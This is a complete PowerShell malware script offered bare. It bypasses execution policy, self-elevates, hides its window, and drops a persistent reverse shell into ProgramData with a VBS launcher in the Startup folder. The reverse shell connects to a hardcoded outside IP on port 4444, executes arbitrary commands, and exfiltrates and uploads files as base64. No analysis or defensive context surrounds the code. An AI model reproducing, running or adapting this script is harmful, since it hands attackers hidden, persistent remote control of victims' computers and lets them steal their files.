# Bypass execution policy first
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

# Error logging function
function Write-ErrorLog {
    param([string]$ErrorMessage)
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $errorFile = Join-Path $desktopPath "script_errors.txt"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] ERROR: $ErrorMessage"
    Add-Content -Path $errorFile -Value $logEntry
}

try {
    # Check admin privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
    if (-NOT $isAdmin) {
        Write-ErrorLog "Admin privileges required but not available"
        # Try to self-elevate
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -Wait
        exit
    }

    # Hide window using multiple methods
    try {
        # Method 1: Add-Type
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        ' -ErrorAction SilentlyContinue
        
        $consolePtr = [Console.Window]::GetConsoleWindow()
        if ($consolePtr -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
        }
    } catch {
        # Method 2: Alternative hiding
        try {
            $signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
            Add-Type -Name WinAPI -Namespace Windows -MemberDefinition $signature
            $hwnd = (Get-Process -PID $pid).MainWindowHandle
            [Windows.WinAPI]::ShowWindow($hwnd, 0)
        } catch { }
    }

    # Create persistent directory
    $persistentPath = "$env:ProgramData\SystemShell.ps1"
    
    try {
        # Reverse shell script content
        $shellScript = @'
# Bypass execution policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

try {
    # Hide window
    try {
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        ' -ErrorAction SilentlyContinue
        $consolePtr = [Console.Window]::GetConsoleWindow()
        if ($consolePtr -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
        }
    } catch { }

    $ip = "143.110.191.171"
    $port = 4444
    
    while($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            while($client.Connected) {
                $writer.Write("PS " + (Get-Location).Path + "> ")
                $command = $reader.ReadLine()
                
                if($command -eq "exit") { break }
                if($command -eq "quit") { return }
                
                if($command.StartsWith("download ")) {
                    $file = $command.Substring(9)
                    if(Test-Path $file) {
                        try {
                            $content = [System.IO.File]::ReadAllBytes($file)
                            $writer.Write("[DOWNLOAD]:" + [Convert]::ToBase64String($content) + "`n")
                        } catch {
                            $writer.Write("Download Error: " + $_.Exception.Message + "`n")
                        }
                    } else {
                        $writer.Write("File not found`n")
                    }
                    continue
                }
                
                if($command.StartsWith("upload ")) {
                    $parts = $command.Split(' ', 3)
                    if($parts.Length -eq 3) {
                        try {
                            $filePath = $parts[1]
                            $fileContent = [Convert]::FromBase64String($parts[2])
                            [System.IO.File]::WriteAllBytes($filePath, $fileContent)
                            $writer.Write("Upload successful`n")
                        } catch {
                            $writer.Write("Upload Error: " + $_.Exception.Message + "`n")
                        }
                    }
                    continue
                }
                
                try {
                    $output = Invoke-Expression -Command $command 2>&1 | Out-String
                    $writer.Write($output)
                } catch {
                    $writer.Write("Command Error: " + $_.Exception.Message + "`n")
                }
            }
            
            $reader.Close()
            $writer.Close()
            $stream.Close()
            $client.Close()
        } catch {
            Start-Sleep -Seconds 10
        }
    }
} catch {
    Start-Sleep -Seconds 30
    PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$persistentPath"
}
'@

        # Save the script
        Set-Content -Path $persistentPath -Value $shellScript -Force

        # Create persistence
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $vbsPath = Join-Path $startupPath "SystemRun.vbs"
        
        # VBS launcher
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$persistentPath""", 0, False
"@
        Set-Content -Path $vbsPath -Value $vbsContent -Force

        # Start immediately
        Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""

    } catch {
        Write-ErrorLog "Script creation failed: $($_.Exception.Message)"
    }

} catch {
    Write-ErrorLog "Main execution failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 3
